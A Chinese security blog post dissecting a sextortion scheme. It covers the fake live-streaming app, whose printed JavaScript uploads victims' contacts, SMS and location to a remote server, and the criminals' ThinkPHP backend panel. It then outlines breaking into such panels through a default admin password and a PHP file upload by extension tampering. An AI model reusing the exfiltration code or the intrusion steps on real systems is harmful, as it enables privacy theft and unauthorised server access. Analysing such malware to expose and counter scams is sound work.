> 因法律原因，本文中所提及技术的关键步骤已省略，且在无危害的封闭环境下模拟进行。本文仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与本人无关。

## 果聊敲诈

视频衤果聊敲诈这件事情,也就是起源于最近这几年。而且势头只增不减。让公安机关很是头疼。

犯罪团伙往往利用“单男”的“猎奇”心态，以“衤果聊”为诱饵，先录下被害人不雅视频，同时引诱被害人安装所谓的直播APP（实际上植入木马程序），窃取被害人手机通讯录等隐私，最后以发送不雅视频给通讯录成员为手段迫使被害人“花钱消灾”。案发后，这类被害人往往因顾忌对方手中的不雅视频而忍气吞声，一步步堕入犯罪分子的“桃色”陷阱。

大量的案发给老百姓造成了巨大的财产损失，但是囿于公安机关执法力量的有限，大部分通过视频衤果聊被敲诈的案件尚难以侦破。笔者亲眼所见许多人被敲诈至倾家荡产、欠债累累。

本文就衤果聊敲诈过程中所使用的后门APP、敲诈所用的后台程序进行讨论。不过在讨论这两个程序以前，我们首先了解勒索过程中的三个关键步骤。

## 勒索过程中的三个关键步骤

### 寻找目标受害者

犯罪份子一般会在陌陌、探探、soul等交友软件上通过仿造的“朋友圈”，将自己打造成年轻、貌美的女性用户。借此身份对分辨能力较差、有寂寞心理的男性展开“猎杀”。
引诱男性用户与其进行视频衤果聊、钻入犯罪分子挖好的陷阱。

### 诱导受害者下载后门app

犯罪份子通过“以彩信方式将受害者不雅视频发送至其通讯录所有人”为由勒索受害者。因此对于勒索团队来说，如何获取受害者通讯录是发起勒索的前提。

在提出视频衤果聊后，犯罪分子伪装的女性用户会以自己在直播APP里面直播、怕用常用的聊天APP不安全等理由要求受害者安装其提供的APP。该APP其实就是一种后门APP。在受害者下载并赋予APP获取通讯录权限后，受害者的通讯录、短信、手机相册等隐私信息就会被上传至后台。

对于这个后门APP，内部一般称之为“前端”。将受害人隐私信息上传到的平台称为“后端”。

这一前一后两部分将是本文着重进行梳理的内容。

#### 诱导受害者在衤果聊过程中露出隐私部位与面部

在衤果聊过程中受害者露出的隐私部位与面部是敲诈勒索的筹码，犯罪分子在视频衤果聊过程中通过语言、文字等各种方式诱导受害者露出的隐私部位与面部并进行录像、截图。在大多数情况下视频衤果聊过程中的受害者在心理上已经对对方没有防备，因而很少有在这一步终止行为或拒绝的。这一部分本文不多赘述。

但值得一提的是，在视频衤果聊中犯罪分子一般是利用虚拟摄像头技术播放已经录制好的画面，你以为你在和真人聊天，实际上是对着已经录制好的视频白日做梦。不过也有在视频中真人出镜的：AI换脸+仿真硅胶皮套，硅胶皮套里面其实是一个如假包换的小伙子。

![1629959833_61273699dd9544835c3fb.png!small?1629959833960](https://image.3001.net/images/20210826/1629959833_61273699dd9544835c3fb.png!small?1629959833960)

## "前端"： 后门APP

犯罪分子通过后门APP窃取受害者的通讯录、短信、手机相册等隐私信息。在研究后门APP的源代码开始时笔者发现，实际上这个所谓的“后门”APP只是用JS写的H5应用。也并不具有“后门”的完全功能、只有上传通讯录、短信、相册、位置等信息的能力。![image-20210804204059371](https://image.3001.net/images/20210809/1628513505_611124e168a764cf2b325.jpg!small)

可以看到后门APP的其实是用JS写的H5应用，犯罪团伙通过使用 **HBuilderX**

提供的云打包功能进行编译打包成apk包或ipa包。

通过 **HBuilderX**
，可以非常方便的打包APP，安卓的apk文件一般是直接发送给受害者，或者通过第三方发布网站，比如发一个二维码或者链接让受害者扫码下载。IOS也是利用第三方发布网站或Test
Flight测试渠道，与安卓相似但由于苹果生态的限制会麻烦一些。![image-20210804204547785](https://image.3001.net/images/20210809/1628513505_611124e1bed87ae30220c.jpg!small)

以下是该项目的目录结构：

    
    
    ├── css
    │   ├── mui.css
    │   └── mui.min.css
    ├── images
    │   ├── bj.png
    │   ├── src_images_but_dianz_n.png
    │   ├── src_images_but_dianz_s.png
    │   ├── src_images_but_guanb.png
    │   ├── src_images_but_shouc_n.png
    │   ├── src_images_but_shouc_s.png
    │   ├── src_images_but_xiangj.png
    │   ├── src_images_toux01.png
    │   ├── src_images_toux02.png
    │   ├── src_images_toux03.png
    │   ├── src_images_toux04.png
    │   ├── src_images_toux05.png
    │   ├── src_images_toux06.png
    │   └── src_images_toux07.png
    ├── index.html
    ├── js
    │   ├── jq.js
    │   └── mui.min.js
    ├── list.html
    ├── manifest.json
    └── unpackage
        └── res
            └── icons
                ├── 1024x1024.png
                ├── 120x120.png
                ├── 144x144.png
                ├── 152x152.png
                ├── 167x167.png
                ├── 180x180.png
                ├── 192x192.png
                ├── 20x20.png
                ├── 29x29.png
                ├── 40x40.png
                ├── 58x58.png
                ├── 60x60.png
                ├── 72x72.png
                ├── 76x76.png
                ├── 80x80.png
                ├── 87x87.png
                └── 96x96.png
    
    6 directories, 38 files
    

可以看到整个项目非常简单，就是一个简单的H5应用。使用了mui前端框架和Native.js for Android来调用安卓接口。

关键的功能代码集中在`index.html`中的`js`片段中：

![image-20210804220550084](https://image.3001.net/images/20210809/1628513506_611124e2bc0faf1104cf3.jpg!small)

在代码中我们可以看到后台上传信息的api地址

![image-20210804222128758](https://image.3001.net/images/20210809/1628513507_611124e3304ffa7860360.jpg!small)

代码首先会通过方法`getPermission()`获取手机通讯录权限:

![image-20210804224301704](https://image.3001.net/images/20210809/1628513507_611124e3e31057dac9749.jpg!small)

等受害者赋予app权限后,只需要受害者在APP中填写手机号码和"女"用户提供的邀请码进行"注册",即可触发上传逻辑,将受害者的通讯录,短信,位置等隐私数据上传至后台.

![image-20210804230626013](https://image.3001.net/images/20210809/1628513508_611124e47ac9cbfa85c33.jpg!small)

本来笔者以为此处的邀请码是随意填写的,结果在研究后台的时候发现,邀请码也会被上传至后台.
原来每名实施敲诈的犯罪分子的邀请码是唯一的,在犯罪团伙中以该邀请码为凭据来计算"业绩"。

不得不说,这帮犯罪分子还真把这个当生意做了。由此也可以想象存在相当数量较大规模的团伙.

### 部分关键代码:

上传受害者个人隐私信息的代码主要是如下几个方法实现:

    
    
    //参数sjh为受害者手机号,yqm为受害者填写的邀请码
    function dingwei(sjh, yqm)//上传受害者定位信息
    function huoqu(sjh, yqm)//上传受害者通讯录 
    function requestPermission(sjh, yqm)//上传受害者短信
    ....
    

我们以上传受害者通讯录的方法为例:

    
    
    function huoqu(sjh, yqm) {
    var con = sjh + "**" + yqm + '**' + address;
    plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {
        addressbook.find(["displayName", "phoneNumbers"], function (contacts) {
    for (var i = 0, len = contacts.length; i < len; i++) {
                con = con + '=' + contacts[i].displayName + '|' + (contacts[i].phoneNumbers.length == 0 ? "" : contacts[i].phoneNumbers[0].value);
            }
    
            mui.ajax(apiserver + 'api', {
                data: {
                    data: con
                },
                dataType: 'text', //服务器返回json格式数据
                type: 'post', //HTTP请求类型
                timeout: 10000, //超时时间设置为10秒；
                success: function (data) {
                        //alert(data)
                        if (data == '正在加载列表') {
                            dingwei(sjh, yqm);
                            mui.openWindow({
                                url: 'list.html',
                                show: {
                                    autoShow: true
                                }
                            });
                        } else {
                            mui.toast(data)
                        }
                        //console.log(con)
                    },
                    error: function (xhr, type, errorThrown) {
                        //异常处理；
    
    
                    }
            });
    
    
    
        }, function () {
            mui.alert("为保证用户质量，使用本app请同意通讯录授权 ");
        }, {
            multiple: true
        });
    }, function (e) {
        mui.alert("为保证用户质量，使用本app请同意通讯录授权 ");
    });
    }
    
    });
    

方法首先调用接口获取了手机通讯录:

    
    
    plus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {
        addressbook.find(["displayName", "phoneNumbers"], function (contacts) {
    
            }
    

然后将通讯录中的所有数据以明文方式转储在一个字符串变量`con`中:

    
    
    con = con + '=' + contacts[i].displayName + '|' + (contacts[i].phoneNumbers.length == 0 ? "" : contacts[i].phoneNumbers[0].value);
    

变量`con`中储存的通讯录数据形式如下例:

    
    
    con='受害人手机号**邀请码**定位=132****1834|oriole=198****2231|刘总=133****2135|妈妈=176****4491|爸爸=157****5893|老婆=186****2842|王老师=135****8881|物业张=198****6352|公司zzHR=158****6631|孙总=138****4423|李经理=186****3555|大佬郑=176****2232|孙胜男=132****1231|叶冠群'
    

最后再将明文储存的数据异步上传至后台,同时还启动了上传位置的逻辑:

    
    
    mui.ajax(apiserver + 'api', {
                data: {
                    data: con
                },
                dataType: 'text', //服务器返回json格式数据
                type: 'post', //HTTP请求类型
                timeout: 10000, //超时时间设置为10秒；
                success: function (data) {
                        //alert(data)
                        if (data == '正在加载列表') {
                            dingwei(sjh, yqm);
                            mui.openWindow({
                                url: 'list.html',
                                show: {
                                    autoShow: true
                                }
                            });
                        } else {
                            mui.toast(data)
                   ....
    

至于目标url,后台的API地址`apiserver`是在这段js开头就定义好的:

    
    
    var apiserver = 'http://114.**.**.12/api/uploads/';
    

同时可以得知上传通讯录数据的API地址是`/api/uploads/api`

其他一些功能的API地址是:

    
    
    上传短信: /api/uploads/api/apisms
    上传定位: /api/uploads/api/apimap
    ....
    

## "后端":数据上传后台

现在"黑产圈子"里用的比较多的后台是叫一个"完美通讯录"的后台网站,也叫"APPV1"版通讯录,也有自己修改以后叫"xxx通讯录"的.现在还有什么"完美通讯录VIP通讯录",版本花样很多.功能也不尽相同,有的能查看相册内容,有的甚至已经可以远控.但是万变不离其宗,完美通讯这个站是各种版本的根源。

以上的认识是笔者从有限的研究和资料中所下的结论,由于并不涉足,也没有什么网络犯罪调查的经验,所以在见识上要短很多,还请各位大佬指教。

![image-20210806234942745](https://image.3001.net/images/20210809/1628513508_611124e4c7e7dd474a75e.jpg!small)

后台站是基于thinkphp5.0.24二次开发的一款小众cms:
tplay.环境就是简单的NGINX+PHP+MySQL,大部分都基于宝塔且开启了伪静态。

访问`/admin/common/login.shtml`可进入登录页面,后台站的管理员账户admin默认密码是123456。

> 此站为测试学习使用且搭建在内网环境中,切勿尝试,触犯法律。

![image-20210807222654180](https://image.3001.net/images/20210809/1628513509_611124e5a188a37067a7c.jpg!small)

在左侧菜单栏的`查看通讯录数据`中能够浏览受害者隐私信息上传的情况

![image-20210807223015558](https://image.3001.net/images/20210809/1628513510_611124e62ed4f7d55e9bf.jpg!small)

在设备查看一栏中可以看到所有的受害者设备:

![image-20210807223129876](https://image.3001.net/images/20210809/1628513510_611124e67724261fc9d1e.jpg!small)

可以看到在此处能够查看其所在位置、通讯录、短信等等，这些信息也可以直接下载。大部分情况犯罪分子会把这些数据下载下来再进行勒索。

在线定位的功能，是通过手机自身定位后上传的位置信息，因而非常精确。这里不做展示，查看通讯录功能可以完整查看受害者的通讯录信息，包含姓名、电话以及往来短信。

![image-20210807224018627](https://image.3001.net/images/20210809/1628513510_611124e6dda23210c5e3c.jpg!small)

受害者手机内的所有短信也同样会被上传：

![image-20210807224243701](https://image.3001.net/images/20210809/1628513511_611124e792ca5b59e5c6b.jpg!small)

### 部分关键代码

分析过前端代码时我们可以看到，后门APP通过后台API接口明文上传了受害者的隐私信息，这在后台的PHP代码中可以找到对应的代码逻辑部分。所有的关键功能都集中在`app/api/controller/Uploads.php`中：

![image-20210807231154865](https://image.3001.net/images/20210809/1628513512_611124e848e023548b49b.jpg!small)

读取通讯录的代码片段:

    
    
    else{
    					$co = $this->getip($ip);
                     	$ipdz = $co;
    					$regdata = array('name'=>$aaa[0],'code'=>$aaa[1],'clientid'=>$aaa[2],'login_time'=>$time,'ip'=>$ip,'ipdz'=>$ipdz);
    					$userid = db('user')->insertGetId($regdata);
    					if($userid){
    						if(count($a) != 0) {
    							foreach ($a as $k => $v) {
    								if ($k>0){
    								$b=explode('|',$v);
    								$arr['userid'] = $userid;
    								$arr['username'] = $b[0];
    								$arr['umobile'] = $b[1];
    								$arr['addtime'] = $time;
    								$res[] = $arr;
    								}
    							};
    							$nums = 100;
    							$limit = ceil(count($res)/$nums);
    							for ($i=1;$i<=$limit;$i++) {
    								$offset=($i-1)*$nums;
    								$data=array_slice($res,$offset,$nums);
    								$result=db('mobile')->insertAll($data);
    							};	
    ....
    

以上代码实现对受害者上传的通信录进行解析并将其储存进数据库.逻辑比较简单,就是用`=`等号分割通讯录联系人信息,每个联系人信息用`|`分隔开联系人姓名和手机号码。然后插入数据库中。

讲一句题外话,写这个站的人水平真的很一般,用这种奇怪的格式明文传送数据就算了,变量名竟然还用$a和$b此类,可见不是什么正经之流。

## 初步侦查的思路

### 获取后门APP样本,分析流量获取后台地址

首先受害者的手机上一般是还存在后门APP或者下载渠道的,第一时间应该还是获取APP样本。

建议不必先对APP进行逆向分析,因为一是APP只是一个简单的H5应用,没有逆向的必要,再一个APP中最有价值的线索是后台地址,为了免杀,做APP的团队对代码一定是由混淆的。这一点几乎是可以肯定的,而后台地址我们最方便的方式是对APP抓一个包,且APP与服务器后台通讯是明文的,走的是HTTP,我们可以轻而易举获取后台地址等等有价值信息。

不建议安装在模拟器上进行抓包分析,模拟器一般是没有通讯录这一部分的,APP尚未发起连接就会因为在获取通讯录时报错退出。建议平时准备一个测试机,在测试机器上进行抓包,分析流量。
这个APP不走代理,直接使用我们常用的抓包工具即可。比如抓包精灵,Fiddler,Tcpdump等等。IOS上可以使用Stream(APPStore),
Charles等等。如何抓包在此不题。

### 获取服务器后台地址后进行渗透

衤果聊后台的这一套源码当初在设计的时候就把管理员admin密码默认设置成123456。犯罪分子安全意识比较"差",很多平台都是不改的。如果运气好碰到没改密码的,我们可以直接进后台。

如果能进后台,后面的事情就非常简单。在`系统->设置->网站设置`中可以修改上传文件限制:

![image-20210808001232634](https://image.3001.net/images/20210809/1628513512_611124e8bd37384bef62d.jpg!small)

作者如此慷慨,我们当然要把php加进去了。

上传点在上传头像的地方,还是在`系统`中,在`个人->个人信息`,可以修改头像,通过此处随便传个phpinfo先。

![image-20210808001606909](https://image.3001.net/images/20210809/1628513514_611124ead67a6147944c8.jpg!small)

因为有这里有layui的前端限制,还不能直接传php文件,用bp抓个包修改一下后缀名就行。

![image-20210808164128039](https://image.3001.net/images/20210809/1628513515_611124eb41e2c1afad57d.jpg!small)

上传成功:

![image-20210808165320625](https://image.3001.net/images/20210809/1628513516_611124ec52c30e8f21997.jpg!small)

如果平台修改了弱密码,那难度就比较大了,由于thinkphp版本是5.0.24,正好是thinkphp系列中比较安全的一个版本。此时可以尝试找一找旁站,有很多案例显示犯罪团伙不止搞"衤果聊"一套"业务",在同一个服务器上可能搭建了多种诈骗网站,可以扫一扫看一看有没有其他的点。

## 后话

写这篇文章的目的也是希望让更多人知道衤果聊诈骗的套路,搞安全的咱不要玩鹰的让鹰啄了眼睛,单身不要紧,一定要忍受住诱惑。很多时候平时能看穿的套路一旦有欲望的加持,理性会迅速变得廉价。

再一个如果真的哪位兄弟或兄弟的兄弟有一天遭受此劫,笔者建议一分钱都不要转。虽然对方敲诈的语言非常令人恐惧,但是笔者曾经咨询过一些民警,绝大部分的情况犯罪分子并没有发送带有受害者不雅视频的链接,因为站在犯罪分子的时间成本角度讲,有花钱给你发彩信的时间,不如去敲诈下一个。"业务"是很繁忙的,不要以为很多人围着你一个人敲诈,大部分情况你只是今天的众多受害者之一。最好的方法就是马上脱离接触,一刀切总比钝刀子割肉要强。

最后如果有需要审审源码,进一步研究的,可以私信笔者获取源码,但是只限于研究学习使用,千万不要试图做什么违法之事。正义可能会迟到,但永远不会缺席。

